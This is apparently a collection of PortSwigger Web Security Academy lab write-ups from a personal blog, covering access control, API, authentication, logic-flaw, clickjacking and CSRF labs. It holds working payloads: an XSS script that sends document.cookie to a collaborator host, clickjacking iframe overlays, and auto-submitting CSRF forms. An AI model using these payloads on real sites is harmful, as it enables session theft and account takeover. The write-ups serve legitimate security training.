[{"content":"1. Lab: Unprotected admin functionality This lab has an unprotected admin panel.\nSolve the lab by deleting the user carlos.\nOn /robots.txt we got the admin portal\nOn deleting the carlos user from admin portal will solve the lab\nSolution: check robots.txt file\n2. Lab: Unprotected admin functionality with unpredictable URL This lab has an unprotected admin panel. It\u0026rsquo;s located at an unpredictable location, but the location is disclosed somewhere in the application.\nSolve the lab by accessing the admin panel, and using it to delete the user carlos.\nIf we check the source code, we will see the admin portal URL.\nOn visiting that, we can able to get the panel\nSolution: Check source code to find hidden URL\n3. Lab: User role controlled by request parameter This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.\nSolve the lab by accessing the admin panel and using it to delete the user carlos.\nYou can log in to your own account using the following credentials: wiener:peter\nWhen we visit /admin it says Admin interface only available if logged in as an administrator, so we will log into our account and then check the cookies.\nChanging the cookie value of Admin to true will give us access to admin portal.\nSolution: Check cookies\n4. Lab: User role can be modified in user profile This lab has an admin panel at /admin. It\u0026rsquo;s only accessible to logged-in users with a roleid of 2.\nSolve the lab by accessing the admin panel and using it to delete the user carlos.\nYou can log in to your own account using the following credentials: wiener:peter\nWhen we login as wiener and then change the email, we see there is a roleid reflected in response, so what if we try to add roleid parameter in the frontend and then change the email, will that change the roleid as well? It\u0026rsquo;s see\nYes, it does! Now if we login to /admin we can able to delete carlos user.\nSolution: Always check what other parameters you can change!\n5. Lab: URL-based access control can be circumvented This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.\nTo solve the lab, access the admin panel and delete the user carlos.\nWe cannot be able to access /admin, but if we add X-Original-Url header, we can able to access the admin.\nIn order to delete carlos user, we have to use ?username=carlos in query and /admin/delete in X-Original-Url header.\nSolution: Use X-Original-Url in order to bypass the restriction\n6. Lab: Method-based access control can be circumvented This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.\nTo solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.\nAfter logging from admin account, we can see it is sending POST request to /admin-roles in order to change the access. Now we will login as wiener and send the same POST request with wiener\u0026rsquo;s account and I am getting unauthorized.\nOn changing the request to GET I can able to bypass that restriction.\nSolution: Changing request from POST to GET can lead us to solution.\n7. Lab: User ID controlled by request parameter This lab has a horizontal privilege escalation vulnerability on the user account page.\nTo solve the lab, obtain the API key for the user carlos and submit it as the solution.\nYou can log in to your own account using the following credentials: wiener:peter\nAfter we login, if we change the username from wiener to carlos in URL, then we can able to access carlos API key.\nSolution: Change username in URL\n8. Lab: User ID controlled by request parameter, with unpredictable user IDs This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.\nTo solve the lab, find the GUID for carlos, then submit his API key as the solution.\nYou can log in to your own account using the following credentials: wiener:peter\nIn this application, we have to enter the userId of carlos, which is GUID, so we can\u0026rsquo;t predict it. But fortunately, we found the ID from the blog.\nSolution: Using that GUID in URL will give us the API Key of carlos\n9. Lab: User ID controlled by request parameter with data leakage in redirect This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response.\nTo solve the lab, obtain the API key for the user carlos and submit it as the solution.\nYou can log in to your own account using the following credentials: wiener:peter\nIf we change the URL from wiener to carlos after login, it will redirect us to login, but if we see the request, we can observe that, before redirecting, the website renders carlos page.\nSolution: Rendering before redirecting\n10. Lab: User ID controlled by request parameter with password disclosure This lab has user account page that contains the current user\u0026rsquo;s existing password, prefilled in a masked input.\nTo solve the lab, retrieve the administrator\u0026rsquo;s password, then use it to delete the user carlos.\nYou can log in to your own account using the following credentials: wiener:peter\nIf we change the username from the URL to carlos, and check the source code, we will see that the password is already there in the form, entering that password will solve the lab.\nSolution: Check the source code!\n11. Lab: Insecure direct object references This lab stores user chat logs directly on the server\u0026rsquo;s file system, and retrieves them using static URLs.\nSolve the lab by finding the password for the user carlos, and logging into their account.\nOn downloading the transcript, it gave us the data. On changing the file name to 1.txt we got the transcript where there is a password for carlos.\nSolution: Change the value of parameter\n12. Lab: Multi-step process with no access control on one step This lab has an admin panel with a flawed multi-step process for changing a user\u0026rsquo;s role. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.\nTo solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.\nThere were 2 steps in order to upgrade user from normal to admin. In the second request, there is an additional parameter called confirmed=true. So I have tried this request from weiner\u0026rsquo;s session and it worked. So the website is thinking that in order to reach 2nd step, user must have been through first step. But if we directly send request to 2nd step, it will work and upgrade the user.\nSolution: Not all things are hardened in flow. Sometimes, a website will implement rigorous access controls over some of these steps, but ignore others.\n13. Lab: Referer-based access control This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.\nTo solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.\nLog in as admin, go to the admin panel, promote Carlos, and send that request to Burp Repeater. Then, in a private window, log in with a non-admin account and try accessing /admin-roles?username=carlos\u0026amp;action=upgrade—you’ll see it’s blocked because there’s no Referer header. Now, take the non-admin session cookie, paste it into the Burp Repeater request, change the username to yours, and resend it.\nSolution: Add Referer header\n","description":"A collection of portswigger access control writeups with examples, notes and writeups.","id":0,"section":"Portswigger","tags":["Portswigger","ACCESS-CONTROL"],"title":"Portswigger Access Control Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-access-control/"},{"content":"1. Lab: Exploiting an API endpoint using documentation To solve the lab, find the exposed API documentation and delete carlos. You can log in to your own account using the following credentials: wiener:peter.\nWhen we update the email it requests PATCH /api/user/wiener, so the base endpoint must be /api.\nClick on DELETE and toolkit will popup, an entering username carlos and sending request will solve the lab.\nSolution: Finding API endpoint using change email\n2. Lab: Finding and exploiting an unused API endpoint To solve the lab, exploit a hidden API endpoint to buy a Lightweight l33t Leather Jacket. You can log in to your own account using the following credentials: wiener:peter.\nAfter mapping the application, we can see there is /api/products/1/price endpoint, where GET and PATCH is allowed. But we have to change content type to application/json\nNext, it says price parameter is missing from body, we will add price 0.\nThe price for jacket is 0 now, add it to the cart and do checkout.\nSolution: check other methods to change data.\n3. Lab: Exploiting a mass assignment vulnerability To solve the lab, find and exploit a mass assignment vulnerability to buy a Lightweight l33t Leather Jacket. You can log in to your own account using the following credentials: wiener:peter.\nIn this application there is GET /api/checkout where it giving JSON response with percentage discount, price and other details, what if we change the request to POST?\nIt worked, but we got error. In the backend, it is expected some JSON response.\nSending the data from GET request into POST body with 100 percentage discount, will place the order.\nSolution: Change GET to POST and change the body to update data.\n4. Lab: Exploiting server-side parameter pollution in a query string To solve the lab, log in as the administrator and delete carlos.\nIf we check the source code of application, we will get this line where it is resetting the password using reset_token parameter. Let\u0026rsquo;s try to add that and see what we are getting!\nInvalid Token! Let\u0026rsquo;s analyze POST request of forgot password\nIf we use administratorx then we will get invalid username. So we will use administrator#foo=bar (url encoded) and it says field is not specified.\nWe will use intruder to fuzz foo with server side parameter variable names with administrator\u0026amp;FUZZ=bar, we got username as field. But from the previous source code analysis we also got one more param that is reset_token, let\u0026rsquo;s try that too (administrator\u0026amp;field=reset_token)!\nUsing that token, we can change password for administrator. Deleting carlos will solve the lab\nSolution: Exploit parameter pollution in the forgot-password request to leak the administrator’s reset token, set a new password, log in as admin, then delete carlos.\n5. Lab: Exploiting server-side parameter pollution in a REST URL To solve the lab, log in as the administrator and delete carlos.\nIf we try to do similar thing from last lab, we will get invalid route.\nSo what I am guessing it, the application making a route based on username. Can we traverse though route using carlos/../administrator. It worked! Next I am trying to find the API documentation, and I got it at carlos/../../../../../openapi.json%23.\nWe can see there is an internal user endpoint, we can request password reset token from there. Payload: carlos/../../../../../api/internal/v1/users/administrator/field/passwordResetToken%23\nSolution: Walk the path traversal until you leak the API definition, pivot to the users/{username}/field/{field} endpoint, swap the field to passwordResetToken on the API, grab the admin\u0026rsquo;s reset token, set a new password, log in as admin, and delete carlos.\n","description":"A collection of portswigger api testing writeups with examples, notes and writeups.","id":1,"section":"Portswigger","tags":["Portswigger","API-TESTING"],"title":"Portswigger API Testing Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-api-testing/"},{"content":"1. Lab: Username enumeration via different responses This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:\nCandidate usernames\nCandidate passwords\nTo solve the lab, enumerate a valid username, brute-force this user\u0026rsquo;s password, then access their account page.\nThis website returns different error messages for invalid username and invalid password.\nWe will use intruder in order to bruteforce username and then check by content length, after we got the correct username (acid) we will do same thing with password (letmein). Once we got the creds, login in will solve the lab.\nSolution: Bruteforce using Intruder\n2. Lab: Username enumeration via subtly different responses This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:\nTo solve the lab, enumerate a valid username, brute-force this user\u0026rsquo;s password, then access their account page.\nIn this case, it says \u0026ldquo;Invalid username or password\u0026rdquo;. So we can\u0026rsquo;t just do username or password enumeration. Let\u0026rsquo;s check if there is anything changing in response. I have used Grep - Extract from burpsuite in order to check for the response. Once we will configure that, and start the attack, we will see there is is a very minor difference in response. Using that we will get username and password.\nSolution: Use Grep - Extract from burpsuite to check for the response (or error in particular)\n3. Lab: Username enumeration via response timing This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user\u0026rsquo;s password, then access their account page.\nYour credentials: wiener:peter\nThis challenge is all about checking response time! Once we start the attack, we will get rate limited, but if we use ParamMiner extension, we will see there is X-Forwarded-For header which can bypass this rate limit. Using that we will start the attack. We will use Pitchfork attack to set the header and the username.\nIn order to fetch username, we will write very long password, and there will be the delay in response. So the username and password are checked differently. Using that data, we will fetch the username.\nSimilar to what we have done for username, we will try the same thing with password given the username is already found. We will sort things by status code and voila, we will get the user.\nSolution: Check response timing and predict how the backend is handling the query!\n4. Lab: Broken brute-force protection, IP block This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim\u0026rsquo;s password, then log in and access their account page.\nYour credentials: wiener:peter\nVictim\u0026rsquo;s username: carlos\nIn the materials, it says For example, you might sometimes find that your IP is blocked if you fail to log in too many times. In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully. This means an attacker would simply have to log in to their own account every few attempts to prevent this limit from ever being reached.\nSo we might have to look, after how many requests we are rate limited and make a wordlist accordingly that will login as wiener after 3 attempts from carlos to reset rate limit.\nBut instead of that, I have used resource pool in order to send 1 request every second and got the results.\nSolution: Use resource pool or check how it is getting rate limited and is there any way to bypass it.\n5. Lab: Username enumeration via account lock This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user\u0026rsquo;s password, then access their account page.\nIn this challenge, if we try to login more than 5 times the account is getting locked if it\u0026rsquo;s a valid account. So from this we can infer that if the account is locked out, that means it\u0026rsquo;s the correct username. Leveraging that, we will use clusterbomb attack and send 5 requests for each username and then sort the response and we will see ad account is getting locked out.\nAs we have username now, we will use sniper attach to get the password.\nSorting the results from content length will give us the password.\nSolution: Always check how the account is locked.\n6. Lab: Broken brute-force protection, multiple credentials per request This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos\u0026rsquo;s password, then access his account page.\nVictim\u0026rsquo;s username: carlos\nIn this challenge, we can able to bypass the protection using array of passwords, instead of single one. The thing is, sometimes website accept different types of input without any validation and write queries without checking for data types. Therefore this kind of vulnerability arises.\nSolution: Check for different data types.\n7. Lab: 2FA simple bypass This lab\u0026rsquo;s two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user\u0026rsquo;s 2FA verification code. To solve the lab, access Carlos\u0026rsquo;s account page.\nYour credentials: wiener:peter\nVictim\u0026rsquo;s credentials carlos:montoya\nThis lab is pretty straightforward, when we try to login with carlos, it will redirect us to /login2. But on visiting home and going to myaccount, we can able to access that. So the thing is, sometimes without checking the 2FA code, website allows us to view pages which is not intended.\nSolution: after login (but without 2FA) - check if we are allowed to access blocked pages.\n8. Lab: 2FA broken logic This lab\u0026rsquo;s two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos\u0026rsquo;s account page.\nYour credentials: wiener:peter\nVictim\u0026rsquo;s username: carlos\nYou also have access to the email server to receive your 2FA verification code.\nI have checked everything with wiener account on which endpoint is doing what, then I logged in to carlos account (got password of carlos using bruteforcing) and in 2FA /login2 I have sent to intruder and got the mfa code using bruteforcing. Using that code to the website solved the lab.\nSolution: Check whether you can bruteforce the code or not!\n9. Lab: Brute-forcing a stay-logged-in cookie This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.\nTo solve the lab, brute-force Carlos\u0026rsquo;s cookie to gain access to his My account page.\nYour credentials: wiener:peter\nVictim\u0026rsquo;s username: carlos\nIn this challenge, we can see the website is adding stay-logged-in cookie and when we double click on that cookie, we will see it\u0026rsquo;s base64 encoded of username:md5(password) so it turns out to be base64(username:[md5(password)]). We can do similar attack using Burp Intruder. Add Rules into Payload processing will give us the results.\nSolution: Check for weakly encoded cookies.\n10. Lab: Offline password cracking This lab stores the user\u0026rsquo;s password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos\u0026rsquo;s stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the \u0026ldquo;My account\u0026rdquo; page.\nYour credentials: wiener:peter\nVictim\u0026rsquo;s username: carlos\nThis challenge is all about XSS+Hash Cracking. In order to steal the cookie I am using this payload.\n\u0026#34;\u0026gt;\u0026lt;script\u0026gt;fetch(\u0026#39;https://BURP-COLLABORATOR-SUBDOMAIN\u0026#39;, { method: \u0026#39;POST\u0026#39;, mode: \u0026#39;no-cors\u0026#39;, body:document.cookie }); \u0026lt;/script\u0026gt; It will fetch the cookies and send it to burp collaborator and once we got the cookie it\u0026rsquo;s in base65(username:md5(password)) style. So we will simply use crackstation in order to crack the hash and login with the account and delete carlos user in order to solve the lab.\nAlternatively we can also use XSS+CSRF to delete carlos automatically all in one payload.\nSolution: We can leverage weak session with other vulnerabilities like XSS and CSRF\n11. Lab: Password reset broken logic This lab\u0026rsquo;s password reset functionality is vulnerable. To solve the lab, reset Carlos\u0026rsquo;s password then log in and access his \u0026ldquo;My account\u0026rdquo; page.\nYour credentials: wiener:peter\nVictim\u0026rsquo;s username: carlos\nVery straightforward lab. During password reset of wiener account when we change the username from wiener to carlos, it can able to change the password for carlos. So basically, the website is not checking for the reset token as per the account.\nSolution: Changing the username reset the password.\n12. Lab: Password reset poisoning via middleware This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos\u0026rsquo;s account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.\nIn this website, there is no username parameter in forgot password request. We will try password reset poisoning attack using the X-Forwarded-Host header.\nThis will give us the reset password token in exploit server\u0026rsquo;s logs.\nUsing this token will reset carlos\u0026rsquo;s password.\nSolution: Host header injection to hijack password reset token\n13. Lab: Password brute-force via password change This lab\u0026rsquo;s password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos\u0026rsquo;s account and access his \u0026ldquo;My account\u0026rdquo; page.\nYour credentials: wiener:peter\nVictim\u0026rsquo;s username: carlos\nThis is an interesting challenge, from the error message, we can guess certain things. For example, when the current password is incorrect for multiple times, it locks out the account, but when we try to enter correct current password and different newpass1 and newpass2, it says, password do not match.\nWhen we try to enter wrong password and newpass1 and newpass2 does not match, it says Current password is incorrect.\nSo in order to bruteforce password correctly, we will use different newpass1 and newpass2 and then bruteforce the password.\nSolution: Check for the functionality of backend, check for the error messages, sometimes from error messages one can get how backend is working!\n","description":"A collection of portswigger authentication vulnerabilities writeups with examples, notes and writeups.","id":2,"section":"Portswigger","tags":["Portswigger","AUTHENTICATION-VULNERABILITIES"],"title":"Portswigger Authentication Vulnerabilities Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-authentication-vulnerabilities/"},{"content":"1. Lab: Excessive trust in client-side controls This lab doesn\u0026rsquo;t adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a \u0026ldquo;Lightweight l33t leather jacket\u0026rdquo;.\nYou can log in to your own account using the following credentials: wiener:peter\nIn this application, when we add items to cart, it is also sending the price as a parameter and consider that as the actual price instead of original price. So we will change the price from burpsuite and place an order.\nSolution: Change the price parameter\n2. Lab: 2FA broken logic This lab\u0026rsquo;s two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos\u0026rsquo;s account page.\nYour credentials: wiener:peter\nVictim\u0026rsquo;s username: carlos\nYou also have access to the email server to receive your 2FA verification code.\nLogin with wiener:peter, then on /login2 we have to bruteforce the password and change the verify cookie to carlos. Once we will get the code, we can able to enter it.\nIn GET /login2 we will make sure the code will be sent to carlos by changing the cookie. Then we will send the POST /login2 to intruder in order to bruteforce the code.\nAgain, by sending the code, we will make sure the cookie is set to carlos instead of wiener and boom, we will solve the lab.\nSolution: Cookie handling flow.\n3. Lab: High-level logic vulnerability This lab doesn\u0026rsquo;t adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a \u0026ldquo;Lightweight l33t leather jacket\u0026rdquo;.\nYou can log in to your own account using the following credentials: wiener:peter\nIn this application, we can add quantity to -1.\nBut it says, total price cannot be less than zero, so we will add other items and make price between 0-100.\nWe will add jacket and adjust price with negative other items.\nSolution: Accepting negative value in quantity.\n4. Lab: Low-level logic flaw This lab doesn\u0026rsquo;t adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a \u0026ldquo;Lightweight l33t leather jacket\u0026rdquo;.\nYou can log in to your own account using the following credentials: wiener:peter\nNotetaking thing from this lab is, when the total is very large, it will turn into negative value and then we just have to normalize the total below 100.\nSolution: Pass a very large number to get negative total\n5. Lab: Inconsistent handling of exceptional input This lab doesn\u0026rsquo;t adequately validate user input. You can exploit a logic flaw in its account registration process to gain access to administrative functionality. To solve the lab, access the admin panel and delete the user carlos.\nIn this application, we we try to enter a very large email, it truncates last characters, and only allowing certain characters. For example, if we try to register with 200 A with exploit server email, we will see this behaviour.\nSo, it only took 255 characters. On top of that, there is an admin route which is only allowed for DontWannaCry user, so we have to use that email.\nWhat we will do is, we will add AAAA...@dontwannacry.com.\u0026lt;exploitserveremail\u0026gt;. So after calculating characters we will use 238 A\u0026rsquo;s .\nNow, we have dontwannacry email, going to admin panel and deleting carlos account will solve the lab.\nSolution: Sometimes characters are truncated from backend which leads to unexpected behaviours.\n6. Lab: Inconsistent security controls This lab\u0026rsquo;s flawed logic allows arbitrary users to access administrative functionality that should only be available to company employees. To solve the lab, access the admin panel and delete the user carlos.\nIn this application, register using attacker\u0026rsquo;s email and verify the user, and once we go to my account, we can see change email functionality, if we use dontwannacry email to change it, it doesn\u0026rsquo;t require verification and we can able to access admin portal. Deleting carlos account will solve the lab.\nSolution: change email to access admin portal\n7. Lab: Weak isolation on dual-use endpoint This lab makes a flawed assumption about the user\u0026rsquo;s privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users\u0026rsquo; accounts. To solve the lab, access the administrator account and delete the user carlos.\nYou can log in to your own account using the following credentials: wiener:peter\nIf we remove current-password parameter, we can simply be able to change the password, also, there is username parameter, let\u0026rsquo;s try to change the username to administrator and check if we can able to change it.\nThe new password for administrator account is test. Login with that account and deleting carlos account will solve the lab.\nSolution: Sometimes removing parameters will give unexpected results!\n8. Lab: Insufficient workflow validation This lab makes flawed assumptions about the sequence of events in the purchasing workflow. To solve the lab, exploit this flaw to buy a \u0026ldquo;Lightweight l33t leather jacket\u0026rdquo;.\nYou can log in to your own account using the following credentials: wiener:peter\nAfter every successful order, we will see the order confirmation page\nWhat if we add jacket to the cart and then send this request. Will it confirm the order? Yes, it will. This is how we can solve the lab.\nSolution: Without placing the order, we will send order confirmation request.\n9. Lab: Infinite money logic flaw This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a \u0026ldquo;Lightweight l33t leather jacket\u0026rdquo;.\nYou can log in to your own account using the following credentials: wiener:peter\nWhen we signup to the newsletter, we will see this popup that says - use this coupon SIGNUP30 at checkout.\nNow if we buy giftcard of $10, and use this coupon, it will turn into $7 and then when we redeem the giftcard it will get $10, so our total money will be increased by $3. We will repeat this process using Macros in order to solve this lab.\nTo automate the whole flow, open Burp and go to the Settings tab. Under Sessions, create a new session handling rule. Set the scope to include all URLs, then under Rule Actions, choose to run a macro. You’ll need to record the following sequence of requests: POST /cart, POST /cart/coupon, POST /cart/checkout, GET /cart/order-confirmation?order-confirmed=true, and POST /gift-card.\nOnce recorded, edit the macro. In the GET /cart/order-confirmation response, extract the gift card code from the bottom of the response body. Name the parameter gift-card. Then go to the POST /gift-card request and set its gift-card parameter to use the value from the confirmation response. Test the macro and make sure it actually redeems the generated code by checking for a 302 response on the last step.\nNow switch to Burp Intruder. Send the GET /my-account request to Intruder and use Sniper attack type. For payloads, choose Null payloads and generate 412 of them. Open the Resource Pool settings and set the concurrency to 1—this keeps things stable while Burp handles session cookies and timing. Start the attack and let it run.\nOnce the attack finishes, you’ll have enough credit to buy the jacket and solve the lab. The whole point here is exploiting a broken money logic with a simple coupon and turning it into an automated profit loop.\nSolution: Using giftcard and coupon will compromise the actual price\n10. Lab: Authentication bypass via encryption oracle This lab contains a logic flaw that exposes an encryption oracle to users. To solve the lab, exploit this flaw to gain access to the admin panel and delete the user carlos.\nYou can log in to your own account using the following credentials: wiener:peter\ndescription\n","description":"A collection of portswigger business logic flows writeups with examples, notes and writeups.","id":3,"section":"Portswigger","tags":["Portswigger","BUSINESS-LOGIC-FLOWS"],"title":"Portswigger Business Logic Flows Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-business-logic-flows/"},{"content":"1.

The lab is solved when the account is deleted.\nYou can log in to your own account using the following credentials: wiener:peter\nIn order to overlay the exploit, we will use iframe with div that will delete the account.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;style\u0026gt; iframe { position:relative; width:1000px; height: 700px; opacity: 0.1; z-index: 2; } div { position:absolute; top:450px; left:100px; z-index: 1; } \u0026lt;/style\u0026gt; \u0026lt;div\u0026gt;click\u0026lt;/div\u0026gt; \u0026lt;iframe src=\u0026#34;https://0a9c00f8043f89f680a80375007a00ec.web-security-academy.net/my-account?id=wiener\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 2. Lab: Clickjacking with form input data prefilled from a URL parameter This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an \u0026ldquo;Update email\u0026rdquo; button.\nTo solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a \u0026ldquo;Click me\u0026rdquo; decoy. The lab is solved when the email address is changed.\nYou can log in to your own account using the following credentials: wiener:peter\nSimilar to previous lab\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;style\u0026gt; iframe { position:relative; width:1000px; height: 700px; opacity: 0.1; z-index: 2; } div { position:absolute; top:460px; left:100px; z-index: 1; } \u0026lt;/style\u0026gt; \u0026lt;div\u0026gt;Click me\u0026lt;/div\u0026gt; \u0026lt;iframe src=\u0026#34;https://0a0300310472c7628083124c00f500a3.web-security-academy.net/my-account?email=haaack2er@attacker-website.com\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 3. Lab: Clickjacking with a frame buster script This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?\nTo solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on \u0026ldquo;Click me\u0026rdquo;. The lab is solved when the email address is changed.\nYou can log in to your own account using the following credentials: wiener:peter\nSame payload as previous, we just have to add: sandbox=\u0026quot;allow-forms\u0026quot;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;style\u0026gt; iframe { position:relative; width:1000px; height: 700px; opacity: 0.1; z-index: 2; } div { position:absolute; top:460px; left:100px; z-index: 1; } \u0026lt;/style\u0026gt; \u0026lt;div\u0026gt;Click me\u0026lt;/div\u0026gt; \u0026lt;iframe sandbox=\u0026#34;allow-forms\u0026#34; src=\u0026#34;https://0a26009403604ebe80ca0311005500b6.web-security-academy.net/my-account?email=haaack2er@attacker-website.com\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 4. Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the \u0026ldquo;Click me\u0026rdquo; button to call the print() function.\nThis application contains Submit feedback form, we will enter the details and submit it. We will see that test which is in name is reflected in response.\nIf we use print() instead of test, the payload will get executed! \u0026lt;img src=1 onerror=print()\u0026gt;. So we will simply use that XSS in order to submit the form.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;style\u0026gt; iframe { position:relative; width:1000px; height: 700px; opacity: 0.1; z-index: 2; } div { position:absolute; top:610px; left:100px; z-index: 1; } \u0026lt;/style\u0026gt; \u0026lt;div\u0026gt;Click me\u0026lt;/div\u0026gt; \u0026lt;iframe src=\u0026#34;https://0a0700a70356a176801cc15600e10093.web-security-academy.net/feedback?name=\u0026lt;img src=x onerror=print()\u0026gt;\u0026amp;email=haacker@attacker-website.com\u0026amp;subject=test\u0026amp;message=test#feedbackResult\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 5. Lab: Multistep clickjacking This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on \u0026ldquo;Click me first\u0026rdquo; and \u0026ldquo;Click me next\u0026rdquo; decoy actions. You will need to use two elements for this lab.\nYou can log in to the account yourself using the following credentials: wiener:peter\nSame as before, only change is, instead of one div, we have to make 2 divs.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;style\u0026gt; iframe { position:relative; width:1000px; height: 700px; opacity: 0.1; z-index: 2; } .firstClick, .secondClick { position:absolute; top:510px; left:100px; z-index: 1; } .secondClick { top:300px; left:250px; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;firstClick\u0026#34;\u0026gt;Click me first\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;secondClick\u0026#34;\u0026gt;Click me next\u0026lt;/div\u0026gt; \u0026lt;iframe src=\u0026#34;https://0ae600390320605187e9392600250049.web-security-academy.net/my-account\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; ","description":"A collection of portswigger clickjacking writeups with examples, notes and writeups.","id":4,"section":"Portswigger","tags":["Portswigger","CLICKJACKING"],"title":"Portswigger Clickjacking Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-clickjacking/"},{"content":"1.

Lab: CSRF where token validation depends on token being present This lab\u0026rsquo;s email change functionality is vulnerable to CSRF.\nTo solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer\u0026rsquo;s email address.\nYou can log in to your own account using the following credentials: wiener:peter\nIf we remove the CSRF token from request, it will not check for CSRF.\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://0a2a007c0327b32b80b0b24800a4001c.web-security-academy.net /my-account/change-email\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;test@normal-user.net\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit() \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Solution: Use above payload\n4. CSRF token is not tied to the user session This lab\u0026rsquo;s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren\u0026rsquo;t integrated into the site\u0026rsquo;s session handling system.\nTo solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer\u0026rsquo;s email address.\nYou have two accounts on the application that you can use to help design your attack. The credentials are as follows:\nwiener:peter carlos:montoya Tricky challenge! In order to understand it, let\u0026rsquo;s see how application this application actually built. First of all, it is validating CSRF token centrally. Meaning, it only checks if the CSRF token is used or unused, that\u0026rsquo;s it, and not checking if the CSRF token which is getting generated is associated with the actual logged in user. So if I refresh the update email page and view source, I can see the CSRF token is getting updated on every refresh, so if I use the new CSRF token in exploit, it will consider that unused and will perform CSRF attack.\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://0a4a006c03db855c82bc425600470063.web-security-academy.net /my-account/change-email\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;hacked@normal-user.net\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf\u0026#34; value=\u0026#34;kxgjQWmJ7rLqDqwn2bQeLNavesxNU0ws\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit() \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Solution: Check CSRF token to unused one.\n5. Lab: CSRF where token is tied to non-session cookie This lab\u0026rsquo;s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren\u0026rsquo;t fully integrated into the site\u0026rsquo;s session handling system.\nTo solve the lab, use your exploit server to host 